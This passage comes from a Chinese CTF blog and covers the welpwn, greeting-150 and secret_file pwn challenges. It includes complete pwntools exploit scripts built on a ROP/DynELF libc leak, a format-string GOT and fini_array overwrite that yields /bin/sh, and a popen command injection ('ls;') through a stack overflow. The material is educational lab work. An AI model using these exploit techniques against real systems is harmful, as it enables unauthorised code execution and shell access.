class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line">read_plt &#x3D; elf.plt[&#39;read&#39;]</span><br><span class="line">pop_r12 &#x3D; 0x000000000040089C</span><br><span class="line">pop_rdx &#x3D; 0x000000000040089A</span><br><span class="line">start_addr &#x3D; 0x400630</span><br><span class="line">move_ret &#x3D; 0x0000000000400880</span><br><span class="line">pop_rdi &#x3D; 0x00000000004008a3</span><br><span class="line">def leak(addr):</span><br><span class="line">	p.recv()</span><br><span class="line">	payload &#x3D; &#39;a&#39;*0x18 + p64(pop_r12) + p64(pop_rdx) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(addr) +p64(1) + p64(move_ret) + &#39;a&#39;*56 + p64(start_addr)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	data &#x3D; p.recv(8)</span><br><span class="line">	return data</span><br><span class="line">d &#x3D; DynELF(leak, elf&#x3D;ELF(&#39;.&#x2F;welpwn&#39;))</span><br><span class="line"></span><br><span class="line">system &#x3D; d.lookup(&#39;system&#39;, &#39;libc&#39;)</span><br><span class="line">log.info(&#39;system_addr got &#x3D;&gt; &#39; + hex(system))</span><br><span class="line">p.recv()</span><br><span class="line">bss_addr &#x3D; elf.bss()</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x18 + p64(pop_r12) + p64(pop_rdx) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(bss_addr) + p64(0) + p64(move_ret) + &#39;a&#39;*56 + p64(pop_rdi) + p64(bss_addr) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.send(&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>1.利用DynELF时不知道为什么不能直接利用pop_rdi泄露，大佬都是利用通用rop链来泄露</p>
<p>2.这里利用rop链的时候我们在赋值r12时不能直接赋值plt地址，可能是因为call的原因直接赋值plt地址会报错，需要赋值的是got表地址，可能这就是call调用的特殊性吧（参考got 表和plt表的关联）</p>
<p>3.LibcSearcher存在一定的玄学，DynELF虽然麻烦但更适用</p>
<h1 id="greeting-150"><a href="#greeting-150" class="headerlink" title="greeting-150"></a>greeting-150</h1><h2 id="checksec和查看运行流程-1"><a href="#checksec和查看运行流程-1" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210903160041986.png?raw=true" alt="image-20210903160041986.png"></p>
<p>32位程序开启了canary和NX</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210903160311114.png?raw=true" alt="image-20210903160311114.png"></p>
<p>在运行过程中我们发现，程序会让我们进行一次输入，然后进行一次打印</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210903160029624.png?raw=true" alt="image-20210903160029624.png"></p>
<p>在尝试过程中我们发现，这里存在格式化字符串漏洞</p>
<h2 id="利用IDA分析-1"><a href="#利用IDA分析-1" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210903160504944.png?raw=true" alt="image-20210903160504944.png"></p>
<p>主main（）函数存在格式化字符串漏洞中，我们进入getnline函数中查看详细内容</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210903160511839.png?raw=true" alt="image-20210903160511839.png"></p>
<p>字符的输入存在限制64</p>
<p>那么我们的思路要是怎么样呢？</p>
<p>首先想到能不能劫持got表改为system然后再调用某个函数的时候直接get_shell</p>
<h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>1.需要一个函数能够调用参数帮助我们改为system的got表后能够get_shell</p>
<p>为了解决这个问题，我们在IDA中去寻找</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210903161049924.png?raw=true" alt="image-20210903161049924.png"></p>
<p>main（）中主要是printf并没有满足的函数</p>
<p>那么我们进入getnline函数中寻找</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210903161504593.png?raw=true" alt="image-20210903161504593.png"></p>
<p>借鉴别人的文章中，了解到strlen函数可以当作我们的理想目标</p>
<p>但我们发现了一个致命的问题，那就是以我们目前的构思：</p>
<p>修改strlen的got表为system，然后利用再次输入’\bin\sh\x00’来get_shell<br>如果我们这样操作的话需要两次的输入，但程序只允许我们进行一次输入然后就自动中断了</p>
<h2 id="借鉴-1"><a href="#借鉴-1" class="headerlink" title="借鉴"></a>借鉴</h2><p>首先我们要解决循环只能进行一次的问题</p>
<p><img src="https://img-blog.csdnimg.cn/2020081021451168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg2ODcyNQ==,size_16,color_FFFFFF,t_70" alt="program-running-overview"></p>
<p>main函数结束后也会调用.fini段代码和.fini._arrary段的函数数组中的每一个函数指针</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210903162158763.png?raw=true" alt="image-20210903162158763.png"></p>
<p>于是我们的思路再次出现</p>
<p>在第一次输入的过程中将strlen和fini的首地址分别修改，然后利用第二次输入来get_shell</p>
<p>这里其实我有个疑惑是为什么不能分开修改，先修改fini使其可以循环然后再修改strlen，但其实仔细想想有疑点：</p>
<p>是否每次循环开始都会初始化fini的值，如果是这样就必须得同时修改</p>
<h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;111.200.241.244&#39;,49507)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;greeting-150&#39;)</span><br><span class="line"></span><br><span class="line">main_addr &#x3D; 0x080484F0  #84F0</span><br><span class="line">system_addr &#x3D; 0x08048490 #8490</span><br><span class="line">fini_array &#x3D; 0x08049934 #9934</span><br><span class="line">strlen_got&#x3D;elf.got[&#39;strlen&#39;]</span><br><span class="line"></span><br><span class="line">#p.recvuntil(&quot;Please tell me your name... &quot;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;aa&quot;</span><br><span class="line">payload +&#x3D; p32(strlen_got+2) </span><br><span class="line">payload +&#x3D; p32(strlen_got) </span><br><span class="line">payload +&#x3D; p32(fini_array) </span><br><span class="line"></span><br><span class="line">#0x0804--&gt;2052-18-2-12 &#x3D; 2020</span><br><span class="line">我们要将目的地址改为0x0804，其十进制为2052，18为我们输出的提示语句**Nice to meet you, **，主要这里是有个空格所以18</span><br><span class="line">再减去我们加上的aa（2），最后是我们的偏移12</span><br><span class="line">payload+&#x3D;&quot;%2020c%12$hn&quot;</span><br><span class="line"></span><br><span class="line">#0x8490-0x0804 &#x3D; 31884</span><br><span class="line">我们将Strlen_got表的后四位改为0x8490时前面已经输出的字符的个数为我们上一个改动的数字0x804，所以现在如果要将strlen_got的后四位改为0x8490需要再输出31884个字符</span><br><span class="line">payload+&#x3D;&quot;%31884c%13$hn&quot;</span><br><span class="line"></span><br><span class="line">#0x84F0-0x8490 &#x3D; 96</span><br><span class="line">将fini_array的后四位改为0x84F0</span><br><span class="line">payload+&#x3D;&quot;%96c%14$hn&quot;</span><br><span class="line"></span><br><span class="line">#p.sendline(payload)</span><br><span class="line">#sleep(0.5)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Please tell me your name... &#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#39;Please tell me your name... &#39;)</span><br><span class="line">p.sendline(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h3><p>1.我们需要知道地址的存储方式在此程序中为小端序</p>
<p>eg:0x12345678的小端序存储为\0x78\0x56\0x34\0x21</p>
<p>2.为什么我们的替换顺序要显示strlen的前四位，strlen的后四位，最后才是ifin_array的后四位呢？</p>
<p>我们发现这三个数的大小是从小到大排序的，这时根据我们%n的性质有关的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%n			将前面输出的字符个数赋值给对应的地址</span><br></pre></td></tr></table></figure>

<p>那么我们这样的排序就有利用我们的高效利用</p>
<h1 id="secret-file"><a href="#secret-file" class="headerlink" title="secret_file"></a>secret_file</h1><h2 id="checksec并查看运行流程-2"><a href="#checksec并查看运行流程-2" class="headerlink" title="checksec并查看运行流程"></a>checksec并查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210909191509043.png?raw=true" alt="image-20210909191509043.png"></p>
<p>64位程序并且保护全开，我当时以为是堆题</p>
<img src="/2021/08/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/08/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210909191552191.png" class title="image-20210909191552191">

<p>程序运行后什么都没有显示，我们尝试输入一次，发现在正常运行。</p>
<p>程序运行后会进行一次输入（输入密码），然后应该就是判断后回显。</p>
<h2 id="利用IDA查看-1"><a href="#利用IDA查看-1" class="headerlink" title="利用IDA查看"></a>利用IDA查看</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210909191748215.png?raw=true" alt="image-20210909191748215.png"></p>
<p>当时我以为我框起来的是open函数呢，我当时认为只要密码输入正确后就会打开v14地址所在的内容文件，然后读出</p>
<p>那么要怎么才能够比较成功呢？</p>
<p>这时候我们就需要逆向的思维，也就是从结果开始推</p>
<p>我们需要使得最后的v15 == v17，那么我们这时候就去看看v15和v17是什么</p>
<p>v15:</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210909192037079.png?raw=true" alt="image-20210909192037079.png"></p>
<p>小知识：在IDA中点击一个函数，那么就会标出所有相同的函数位置。</p>
<p>这里我们看见只有最开始定义的时候有v15，在过程中并没有出现v15的变化</p>
<p>v17:</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210909192204582.png?raw=true" alt="image-20210909192204582.png"></p>
<p>这里IDA分析的伪代码显示的是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v5 &#x3D; v17 			我们解读之后是把v17的值赋值给v5，那么只是赋值的话，那么接下来v5的变化也不会改变v17了</span><br><span class="line">这里我们就需要看看汇编码了</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210909192335541.png?raw=true" alt="image-20210909192335541.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这里我们需要区别</span><br><span class="line">move 和 lea 的作用</span><br><span class="line">Move： move a,b</span><br><span class="line">将b的值赋给a，之后a的变化不会影响b</span><br><span class="line">lea: 	lea a,b</span><br><span class="line">将b的地址给a				类似于 a &#x3D; *b（C代码）</span><br><span class="line">那么a的变化就会改变b			也就是说这里IDA解析错误了</span><br></pre></td></tr></table></figure>

<p>那么我们继续追溯v5<br><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210909192656184.png?raw=true" alt="image-20210909192656184.png"></p>
<p>我们看到v5之后会经历一列的函数</p>
<p>先进入sub_DD0中看看</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210909192824928.png?raw=true" alt="image-20210909192824928.png"></p>
<p>这里的变化我当时只知道应该是某种加密但没看懂，这里选择引用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SHA256_Init(&amp;v5) 初始化v5这个指针指向的结构体；</span><br><span class="line">SHA256_Update(&amp;v5, a1, v3) 这个函数可以重复调用，每次将a1指向地址v3长度的字符串进行hash；</span><br><span class="line">SHA256_Final(a2, &amp;v5) 将最后计算出来的hash摘要存在a2指向地址的位置。</span><br><span class="line">整个代码实际上就是将a1 --&gt; dest处最大为0x100的字符串，经过sha256摘要算法处理后存放到a2 --&gt; v16处的内存地址空间。</span><br></pre></td></tr></table></figure>

<p>注意这里的a2对应v16，v16又在之前对应的是v4，也就是说v4的值存储的是这里加密后的内容</p>
<p>并且这里我们发现它加密的大小是256–&gt;0x100</p>
<p>继续向下分析</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210909194015139.png?raw=true" alt="image-20210909194015139.png"></p>
<p>这里是真的离谱，就算看汇编的话显示的也是mov rdi,rbx</p>
<p>但如果我们把指针放在v5上的话会发现它显示的是*char(v5)，就真的离谱</p>
<p>如果这里不是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v7 &#x3D; *char(v5)</span><br></pre></td></tr></table></figure>

<p>那接下来就不通了，因为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int snprintf(char *str, size_t size, const char *format, ...) 设将可变参数(...)按照 format 格式化成字符串，并将字符串复制到 str 中，size 为要写入的字符的最大数目，超过 size 会被截断。</span><br><span class="line">那么这里的解读就是：</span><br><span class="line">把v6的每个字符转换成 16 进制通过 snprintf 存到了 v7 中，并且这里v7对应v5--&gt;v17,v6对应v4对应v16--&gt;加密后的内容</span><br></pre></td></tr></table></figure>

<p>那么最后对比的内容就是初始的v15和加密后的v17</p>
<p>再次逆向思维：</p>
<p>这里加密的v17的来源是dest的前0x100字节</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210909195056749.png?raw=true" alt="image-20210909195056749.png"></p>
<p>而这里dest的来源又是我们输入的内容复制给dest</p>
<p>并且这里我们的输入没有限制也就是说直接复制给dest的话那么就可能存在溢出</p>
<p>并且这里查看初始的栈结构</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210909195425949.png?raw=true" alt="image-20210909195425949.png"></p>
<p>这里我们发现dest的空间和v15的空间是重叠的，那么我们就可以通过输入来控制v15</p>
<p>而v17的内容是dest前0x100个字节的加密</p>
<h2 id="构思-2"><a href="#构思-2" class="headerlink" title="构思"></a>构思</h2><p>我们可以利用输入控制v15的值，并且我们输入的前0x100个字节加密后的内容就是v17</p>
<p>也就是说我们可以利用输入的内容进行覆盖</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们发现dest下面是v14然后是v15，并且我们发现v15的值是不会改变的</span><br><span class="line">那么如果我们对v15进行自主赋值，那么接下来dest0x100的值变为加密，然后只要我们输入的v15和输入的加密相同即可</span><br><span class="line">payload &#x3D; &#39;内容&#39;*0x100 + p64(v14).ljust(0x1B,&#39;\x00&#39;) + 加密.&#39;内容&#39;*0x100</span><br></pre></td></tr></table></figure>

<p>那么我们接下里看看我们读错的popen的用法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">popen函数通过创建一个管道，调用fork产生一个子进程，通过shell来运行传入的参数命令，这个进程必须由pclose函数关闭，而不是fclose函数。</span><br><span class="line"></span><br><span class="line">FILE * popen ( const char * command , const char * type );</span><br><span class="line">int pclose ( FILE * stream );</span><br></pre></td></tr></table></figure>

<p>也就是说在本程序中可以通过v14的值来进行shell虽然这里的shell只能读</p>
<h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import hashlib</span><br><span class="line">p &#x3D; remote(&#39;111.200.241.244&#39;,53765)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x100 + &quot;ls;&quot;.ljust(0x1b,&#39;a&#39;) + hashlib.sha256(&#39;a&#39;*0x100).hexdigest()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h3><p>1.为什么这里的命令需要加一个<strong>；</strong></p>
<p>我们看完popen的解释之后我们知道他是命令管道，所以shell语句需要<strong>；</strong>结尾</p>
<p>2.我们这里需要两次运行第一次shell(ls)，获取文件信息，第二次再进行cat flag</p>
<p>3.这里的加密函数为什么能直接调用，我也不懂</p>
<h1 id><a href="#" class="headerlink" title></a></h1></div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">徐小宇</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/08/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/">http://example.com/2021/08/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/08/26/buu%E5%88%B7%E9%A2%98-2/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">buu刷题-2</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 徐小宇</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>